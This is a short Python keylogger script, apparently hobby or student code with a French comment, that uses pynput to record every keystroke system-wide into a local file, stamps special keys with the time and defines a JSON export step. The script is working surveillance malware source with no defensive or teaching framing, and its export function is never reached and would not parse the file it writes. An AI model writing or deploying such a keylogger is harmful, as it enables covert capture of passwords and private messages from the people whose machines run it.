from pynput import keyboard 
from datetime import datetime 
import os
import json


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

output_file = "keylog.txt" 


def on_press(key): 
    try:
      with open(output_file, 'a') as f:
          f.write(key.char) 
    except AttributeError:
        with open(output_file, 'a') as f:
            f.write(f'[ {str(key)} ]') 
            with open(output_file, 'a') as f: #pour la date
                f.write(f"{timestamp()}")

with keyboard.Listener(on_press=on_press) as listener: 
    listener.join() 

def export_to_json():
    with open(output_file, 'r') as f:
        lines = f.readlines()

    data = [{"timestamp": line.split()[0], "key": line.split()[1]} for line in lines]

    with open("keylog.json", "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

